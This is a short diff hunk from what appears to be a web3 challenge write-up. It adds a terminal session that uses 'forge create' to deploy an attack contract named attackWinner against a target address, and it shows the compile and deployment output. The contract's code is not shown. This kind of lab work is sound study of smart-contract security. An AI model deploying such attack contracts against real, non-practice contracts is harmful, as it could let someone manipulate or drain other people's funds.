@@ -95,6 +95,17 @@ contract attackWinner {
 
 }
 ```
+Lets deploy this using forge
+
+```
+┌──(bl4ck4non💀bl4ck4non-sec)-[~/Documents/web3/foundry/learninggg_foundryyyy]
+└─$ forge create --private-key $PRIVATE_KEY src/attackWinner.sol:attackWinner --constructor-args "0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249" 
+[⠊] Compiling...
+No files changed, compilation skipped
+Deployer: 0x296f076DB25846579300E2F89aCBC20bcd96fd3c
+Deployed to: 0x1BfEF0b68F985a26aDB235afA2Ab86514f6DeDC8
+Transaction hash: 0x650f0540f8ab4636da94695032be758ae909ca136cad42ec4d55b0472cc9ebac
+```
 
 
 
